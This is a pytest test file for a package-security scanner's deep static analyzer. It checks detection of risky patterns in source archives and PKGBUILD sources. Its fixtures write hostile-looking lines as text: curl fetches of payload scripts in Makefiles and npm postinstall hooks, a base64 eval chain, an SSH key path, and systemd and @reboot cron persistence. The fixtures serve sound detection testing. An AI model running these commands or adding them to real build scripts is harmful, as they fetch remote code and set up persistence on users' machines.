import io
import tarfile
from pathlib import Path

from aurascan.analyzers.deep_static import DeepStaticAnalyzer
from aurascan.core.models import AnalysisResult, Confidence, EvidenceQuality, Finding, Phase, Severity, Source


class FakeClamAV:
    def __init__(self):
        self.archive_paths = []
        self.unpacked_paths = []

    def scan_source_archive(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.archive_paths.append(path)
        return AnalysisResult(True, "clean", [])

    def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.unpacked_paths.append(path)
        return AnalysisResult(True, "clean", [])


class FindingClamAV(FakeClamAV):
    def scan_source_archive(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.archive_paths.append(path)
        return AnalysisResult(False, "infected", [Finding(
            rule_id="CLAMAV-TestSig",
            package_name="pkg",
            package_version="1",
            phase=Phase.source_archive_scan,
            source=Source.clamav,
            severity=Severity.CRITICAL,
            confidence=Confidence.CONFIRMED,
            evidence_quality=EvidenceQuality.confirmed_signature,
            file_path=path,
            explanation="signature",
            recommendation="block",
            blocks_installation=True,
            requires_manual_review=False,
            raw_output=f"{path}: TestSig FOUND",
        )])

    def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
        self.unpacked_paths.append(path)
        return AnalysisResult(False, "infected", [Finding(
            rule_id="CLAMAV-TreeSig",
            package_name="pkg",
            package_version="1",
            phase=Phase.unpacked_source_scan,
            source=Source.clamav,
            severity=Severity.CRITICAL,
            confidence=Confidence.CONFIRMED,
            evidence_quality=EvidenceQuality.confirmed_signature,
            file_path=path,
            explanation="signature",
            recommendation="block",
            blocks_installation=True,
            requires_manual_review=False,
            raw_output=f"{path}: TreeSig FOUND",
        )])


class TrackingExtractor:
    def __init__(self, target):
        self.target = target
        self.called = False

    def extract(self, path):
        self.called = True
        return self.target, []


def write_tar(path: Path, entries):
    with tarfile.open(path, "w") as archive:
        for name, content, mode in entries:
            data = content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = mode
            archive.addfile(info, io.BytesIO(data))


def test_deep_static_does_not_execute_package_functions(tmp_path: Path):
    archive = tmp_path / "src.tar"
    marker = tmp_path / "executed"
    write_tar(archive, [("setup.py", f"import subprocess\nfrom pathlib import Path\nPath({str(marker)!r}).write_text('bad')\n", 0o755)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    result = DeepStaticAnalyzer(clamav=FakeClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert marker.exists() is False
    assert any(f.rule_id == "DEEPSTATIC-SETUPPY-SUSPICIOUS" for f in result.findings)


def test_source_archive_clamav_phase_is_reported(tmp_path: Path):
    archive = tmp_path / "src.tar"
    write_tar(archive, [("file.txt", "hello", 0o644)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    result = DeepStaticAnalyzer(clamav=FindingClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert any(f.source == Source.clamav and f.phase == Phase.source_archive_scan for f in result.findings)


def test_unpacked_source_clamav_phase_is_reported(tmp_path: Path):
    source = tmp_path / "unpacked"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\techo harmless\n")
    archive = tmp_path / "src.tar"
    write_tar(archive, [("Makefile", "all:\n\techo harmless\n", 0o644)])
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")

    class TreeOnlyClamAV(FakeClamAV):
        def scan_unpacked_source(self, path, pkg_name="unknown", pkg_ver="unknown"):
            self.unpacked_paths.append(path)
            return FindingClamAV().scan_unpacked_source(path)

    result = DeepStaticAnalyzer(clamav=TreeOnlyClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert any(f.source == Source.clamav and f.phase == Phase.unpacked_source_scan for f in result.findings)


def test_safe_archive_extractor_is_used_by_deep_static_path(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\techo harmless\n")
    archive = tmp_path / "src.tar"
    archive.write_text("fake archive placeholder")
    pkgbuild = tmp_path / "PKGBUILD"
    pkgbuild.write_text(f"pkgname=demo\npkgver=1\nsource=({archive.name})\n")
    extractor = TrackingExtractor(source)

    DeepStaticAnalyzer(extractor=extractor, clamav=FakeClamAV()).analyze_pkgbuild(str(pkgbuild), pkgbuild.read_text())

    assert extractor.called is True


def test_suspicious_package_json_script_scanned_as_text_only(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "package.json").write_text('{"scripts": {"postinstall": "curl https://example.invalid/x"}}')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-NPM-INSTALL-SCRIPT" for f in findings)


def test_credential_reference_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("echo ~/.ssh/id_example\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-CREDENTIAL-PATH" and f.blocks_installation for f in findings)


def test_network_fetch_in_makefile_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "Makefile").write_text("all:\n\tcurl https://example.invalid/payload.sh -o payload.sh\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-NETWORK-FETCH" for f in findings)


def test_eval_chain_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text('eval "$(printf fixture | base64 -d)"\n')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-EVAL-CHAIN" for f in findings)


def test_systemd_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("systemctl enable fixture.service\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    auto = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_unit_file_in_source_tree_is_lower_severity(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "fixture.service").write_text("[Unit]\nDescription=Fixture\n[Service]\nExecStart=/usr/bin/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    unit = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False
    assert not any(f.rule_id == "DEEPSTATIC-SYSTEMD-AUTO-001" for f in findings)


def test_systemd_user_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("install -Dm644 fixture.service \"$HOME/.config/systemd/user/fixture.service\"\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    user = next(f for f in findings if f.rule_id == "DEEPSTATIC-SYSTEMD-USER-001")
    assert user.severity == Severity.HIGH
    assert user.requires_manual_review is True
    assert not any(f.rule_id == "DEEPSTATIC-CREDENTIAL-PATH" for f in findings)


def test_systemd_documentation_comment_does_not_trigger_high_risk_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("# Documentation: systemctl enable fixture.service\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id.startswith("DEEPSTATIC-SYSTEMD-") for f in findings)


def test_cron_persistence_in_source_tree_creates_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("@reboot curl https://example.invalid/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert any(f.rule_id == "DEEPSTATIC-CRON-PERSISTENCE" for f in findings)


def test_deep_static_comment_only_eval_does_not_trigger(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text('# eval "$(curl https://example.invalid/fixture)"\n')

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-EVAL-CHAIN" for f in findings)


def test_cron_documentation_comment_does_not_trigger_high_risk_finding(tmp_path: Path):
    source = tmp_path / "source"
    source.mkdir()
    (source / "script.sh").write_text("# Documentation: @reboot curl https://example.invalid/fixture\n")

    findings = DeepStaticAnalyzer(clamav=FakeClamAV()).inspect_source_tree(source)

    assert not any(f.rule_id == "DEEPSTATIC-CRON-PERSISTENCE" for f in findings)
